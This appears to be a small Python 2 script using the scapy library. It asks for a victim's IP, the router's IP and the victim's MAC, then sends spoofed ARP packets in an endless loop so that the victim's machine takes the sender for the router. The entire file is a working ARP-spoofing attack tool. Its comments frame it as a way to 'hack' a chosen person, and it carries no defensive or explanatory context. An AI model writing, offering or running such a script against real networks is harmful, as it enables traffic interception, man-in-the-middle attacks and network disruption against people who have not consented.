#!/usr/bin/env python

from scapy.all import *
from subprocess import call
import time

op=1 # Op code 1 for ARP requests
victim=raw_input('Enter the target IP to hack: ') #person IP to attack
victim=victim.replace(" ","")

spoof=raw_input('Enter the routers IP *SHOULD BE ON SAME ROUTER*: ') #routers IP.. Should be the same one.
spoof=spoof.replace(" ","")

mac=raw_input('Enter the target MAC to hack: ') #mac of the victim
mac=mac.replace("-",":")
mac=mac.replace(" ","")

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while 1:
	send(arp)
	#time.sleep(2)

